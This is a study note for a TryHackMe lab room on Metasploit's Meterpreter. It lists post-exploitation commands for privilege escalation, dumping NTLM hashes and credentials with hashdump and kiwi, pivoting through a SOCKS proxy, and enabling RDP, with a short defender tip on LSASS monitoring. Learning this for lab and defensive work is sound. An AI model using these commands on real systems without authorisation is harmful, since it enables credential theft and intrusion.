---
tags: [THM, cyber-security-101, exploitation, Meterpreter, room]
platform: TryHackMe
type: room
module: "07 - Exploitation Basics"
module_number: 7
room_number: 28
status: "⬜"
url: https://tryhackme.com/room/meterpreter
difficulty: Easy
---

# 🟦 Metasploit: Meterpreter

> [!abstract] Summary
> Deep dive into Meterpreter — Metasploit's advanced in-memory payload. Post-exploitation commands, privilege escalation, credential dumping, and pivoting.

**Path:** [[Cyber Security 101]] > Module 7 > Metasploit Meterpreter

## 🎯 Learning Objectives
- Use Meterpreter core post-exploitation commands
- Escalate privileges with getsystem
- Dump credentials with hashdump
- Pivot and maintain persistence

## 📖 Key Concepts

### Why Meterpreter?
Runs entirely **in memory** (no disk files) with an encrypted channel — harder for AV to detect.

### Core Commands
```bash
sysinfo                            # OS info
getuid                             # Current user
ps                                 # Process list
ls / cd / cat                      # Navigation
upload /local/file C:\remote\    # Upload
download C:\remote\file /local/  # Download
search -f *.txt                    # Find files
```

### Privilege Escalation
```bash
getuid                    # Check current user
getprivs                  # Current privileges
getsystem                 # Auto privesc attempt
migrate <PID>             # Migrate to higher-priv process
```

### Credential Dumping
```bash
hashdump                  # Dump NTLM hashes (needs SYSTEM)
# Output: username:RID:LM:NTLM:::

load kiwi                 # Load Mimikatz equivalent
creds_all                 # Dump all credentials
lsa_dump_secrets          # LSA secrets
```

> [!warning] `hashdump` and kiwi are heavily flagged by EDR. In modern environments, LSASS memory access is monitored. Defenders: alert on process access to lsass.exe.

### Pivoting
```bash
route add 192.168.1.0/24 1         # Route through session 1
use auxiliary/server/socks_proxy
set SRVPORT 1080 && run
# Then: proxychains nmap 192.168.1.0/24
```

### Post Modules
```bash
run post/multi/recon/local_exploit_suggester   # Find privesc paths
run post/windows/gather/hashdump
run post/windows/manage/enable_rdp             # Enable RDP
```

## 🔑 Key Takeaways
- Meterpreter is in-memory, encrypted — harder to detect than standard shells
- `getsystem` tries multiple privilege escalation techniques automatically
- Dump hashes → crack offline with Hashcat/John or pass-the-hash
- Background with Ctrl+Z, return with `sessions -i N`

## 🔗 Related Notes
- [[CS101-26 - Metasploit Introduction]] · [[CS101-27 - Metasploit Exploitation]]
- [[Meterpreter]] · [[Privilege Escalation]] · [[Credential Dumping]] · [[Pivoting]]
